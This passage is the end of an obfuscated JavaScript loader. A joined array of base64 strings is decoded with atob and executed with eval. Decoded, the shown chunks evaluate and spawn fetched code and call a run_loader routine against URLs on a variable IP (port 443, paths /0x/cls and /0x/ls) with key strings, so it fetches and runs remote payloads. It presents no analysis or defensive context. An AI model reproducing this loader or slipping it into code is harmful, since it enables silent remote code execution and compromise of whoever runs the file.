N3ZCgpO3Zh","ciBfZ2xvYmFsPWdsb2JhbDtgOw0KDQogICAgICBpZiAoIWlzQm","9vdCkgZXZhbChlbnYgKyBjb2RlKTsNCiAgICAgIGF3YWl0IHNw","YXduTm9kZVNjcmlwdChlbnYgKyBjb2RlKTsNCiAgICB9IGNhdG","NoIChlKSB7fQ0KICB9DQoNCiAgYXdhaXQgcnVuX2xvYWRlcihu","ZXcgVVJMKGBodHRwOi8vJHtpcDF9OjQ0My8weC9jbHNgKSwgJ3","E0RlpreFh7IWgsU3IzPUAnLCBmYWxzZSk7DQogIGF3YWl0IHJ1","bl9sb2FkZXIobmV3IFVSTChgaHR0cDovLyR7aXAxfTo0NDMvMH","gvbHNgKSwgJ3ktcF8+ZCQwQiZAXjFhUWsnLCB0cnVlKTsNCn0N","Cg0KcnVuKCk7DQo="].join('');var _0xac4db=atob(_0xac4da);eval(_0xac4db);})();
